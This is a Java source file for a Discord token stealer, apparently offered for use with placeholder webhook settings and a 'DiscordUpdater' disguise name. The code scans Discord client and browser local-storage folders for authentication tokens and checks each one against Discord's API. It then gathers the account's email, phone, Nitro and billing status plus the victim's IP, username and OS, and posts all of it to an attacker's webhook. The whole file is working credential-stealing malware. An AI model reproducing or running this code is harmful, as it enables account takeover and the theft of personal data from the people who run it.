package me.xefer;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static boolean debug = false; // Whether or not everyting should be displayed on terminal window
    private static boolean output = false; // Whether or not everyting should be written to a file
    private static BufferedWriter writer;
    private static StringBuilder final_text = new StringBuilder();

    private static void print(String s) {
        if (debug) {
            System.out.println(s);
        }
        if (output) {
            final_text.append(s).append("\n");
        }
    }

    public static void main(String[] args) throws Exception {
        // TODO: Add more MacOS Options
        // IMPORTANT: Not tested on MacOS or Linux (hopefully works)

        String s = null;


        //Settings:
        String hideAs = "DiscordUpdater"; //What the registry entry should be called.
        String discord_avatar_url = "your_avatar_url_here"; //If you want to change the webhook icon
        String discord_username = "your_webhook_name_here"; //Webhook Name (only when embed)
        String discord_webhook_url = "your_webhook_url_here"; // args[0]; //Change this
        boolean send_embed = true; //True sends embed, False sends it in text
        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
        debug = false; //True sends embed, False sends it in text
        output = false; //True sends embed, False sends it in text

        if (!(args.length > 0)) {
            if (System.getProperty("os.name").contains("Windows")) {
                String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
                String decodedPath = URLDecoder.decode(path, "UTF-8");
                String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];

                //Gatherer
                for (String token : getTokens(ensure_valid)) {
                    sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
                }

            } else {
            }
        }
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    }

    private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
        //Account Information
        String accountInfo_username;

        String accountInfo_email;
        String accountInfo_phoneNr;
        boolean accountInfo_hasNitro; //https://discord.com/api/v8/users/@me/billing/subscriptions
        boolean accountInfo_hasBillingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
        String accountInfo_imageURL;

        //PC Info
        String pcInfo_IP;
        String pcInfo_Username;
        String pcInfo_cpuArch;
        String pcInfo_WindowsVersion;

        //Assign what we know
        pcInfo_Username = System.getProperty("user.name");
        pcInfo_WindowsVersion = System.getProperty("os.name");
        pcInfo_cpuArch = System.getProperty("os.arch");

        //Get IP
        pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);

        //Get discord token
        String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
        accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
        accountInfo_hasNitro = !get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token).equals("[]");
        accountInfo_hasBillingInfo = !get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token).equals("[]");
        accountInfo_email = getJsonKey(tokenInformation, "email");

        accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+getJsonKey(tokenInformation, "id")+"/"+getJsonKey(tokenInformation, "avatar")+".png";



        String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://i.ibb.co/fps45hd/steampfp.jpg\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: "+accountInfo_hasNitro+"\\nBilling Info: "+accountInfo_hasBillingInfo+"\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
        String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```"+accountInfo_hasNitro+"```\\n**Billing Info:**\\n```"+accountInfo_hasBillingInfo+"```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";

        if (sendEmbed) {
            if (debug) {
                print(finishedEmbedContent);
            }
            return finishedEmbedContent;
        } else {
            if (debug) {
                print(finishedTextContent);
            }

            return finishedTextContent;
        }
    }



    private static List<String> getTokens(boolean check_isValid) {
        List<String> tokens = new ArrayList<>();
        String fs = System.getenv("file.separator");
        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb"}, //Lightcord
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
                {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
                {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
                {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
                {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, //Opera Browser Linux
                {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, //Discord Linux
                {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
        };

        for (String[] path : paths) {
            try {
                File file = new File(path[1]);

                for (String pathname : file.list()) {
                    if (pathname.equals("LOCK")) { // this file will give us error so just don't read it reduce search time a bit
                        if (debug) print("Ignore LOCK file in " + path[1]);
                        continue;
                    }
                    if (debug) {
                        print("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
                    }
                    FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}|mfa\\.[\\w]{84}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                            if (debug) {
                                print("Found token: " + m.group() + " in " + pathname);
                                print("isDuplicate: " + tokens.contains(m.group()));
                            }
                            if (!tokens.contains(m.group())) {
                                tokens.add(m.group());
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        if (check_isValid) {
            if (debug) {
                print("checking if valid");
                print(tokens.toString());
            }
            if (!tokens.isEmpty()) {
                Iterator<String> iter = tokens.iterator();

                while (iter.hasNext()) {
                    String str = iter.next();
                    try {
                        get_request("https://discordapp.com/api/v6/users/@me", true, str);
                        if (debug) {
                            print("Token: " + str + " is valid");
                        }

                    } catch (IOException e) {
                        if (debug) {
                            print("Removing token " + str + "            " + e.getMessage());
                        }
                        iter.remove();
                    }
                }

                return tokens;
            } else {
                if (debug) {
                    print("No tokens found\nExitting...");
                    System.exit(0);
                }
                return null;
            }


        } else {
            return tokens;
        }
    }



    /////////////////
    /// Requests ///
    ////////////////

    private static String get_request(String uri, boolean isChecking, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        if (isChecking) {
            connection.setRequestProperty("Authorization", token);
        }
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();
        if (debug) {
            print("GET - "+connection.getResponseCode());
        }
        try (Scanner scanner = new Scanner(responseStream)) {
            String responseBody = scanner.useDelimiter("\\A").next();
            if (debug) {
                print(responseBody);
            }
            return responseBody;
        } catch (Exception e) {
            return "ERROR";
        }
    }

    private static void sendEmbed(String jsonContent, String webhookURL) throws IOException {
        URL url = new URL(webhookURL);
        URLConnection con = url.openConnection();
        HttpURLConnection connection = (HttpURLConnection)con;
        connection.setRequestMethod("POST"); // PUT is another valid option
        connection.setDoOutput(true);

        byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
        int length = out.length;

        connection.setFixedLengthStreamingMode(length);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        connection.connect();
        try(OutputStream os = connection.getOutputStream()) {
            os.write(out);
        }
        if (debug) {
            print("POST - "+connection.getResponseCode());
        }

    }

    private static String getJsonKey(String jsonString, String wantedKey) {
        Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
        Matcher matcher = jsonPattern.matcher(jsonString);

        if (matcher.find()) {
            return matcher.group(0).split("\"")[3];
        }
        return null;
    }

}
